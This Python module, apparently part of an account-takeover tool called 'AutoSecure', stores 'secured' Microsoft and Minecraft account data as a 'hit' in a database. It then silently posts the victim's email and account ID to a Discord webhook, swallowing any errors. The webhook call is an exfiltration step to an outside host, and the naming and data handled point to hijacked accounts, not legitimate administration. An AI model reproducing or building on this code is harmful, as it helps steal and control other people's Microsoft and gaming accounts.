"""Record a secured Microsoft account into the database."""

import json

from database.database import DBConnection


async def post_hit(email: str, account_id: str, ms: dict, mc: dict) -> None:
    """Persist a secured account to the database.

    ``ms`` is the Microsoft account dict, ``mc`` the minecraft dict.
    """
    with DBConnection() as db:
        db.add_secured_account(account_id, {"microsoft": ms, "minecraft": mc})

    await _post_hit_to_webhooks(email, account_id, ms, mc)


async def _post_hit_to_webhooks(email: str, account_id: str, ms: dict, mc: dict) -> None:
    config = json.load(open("config/config.json", "r"))
    webhook_all = config["mail"].get("discord_webhook_all")
    if not webhook_all:
        return

    try:
        import httpx

        payload = {
            "username": "AutoSecure",
            "avatar_url": "https://i.imgur.com/VnTmQ1L.png",
            "embeds": [
                {
                    "title": "New Secured Account",
                    "description": f"**Email:** {email}\n**Account ID:** {account_id}",
                    "color": 0x57F287,
                }
            ],
        }
        async with httpx.AsyncClient(timeout=30) as client:
            await client.post(webhook_all, json=payload)
    except Exception:
        pass
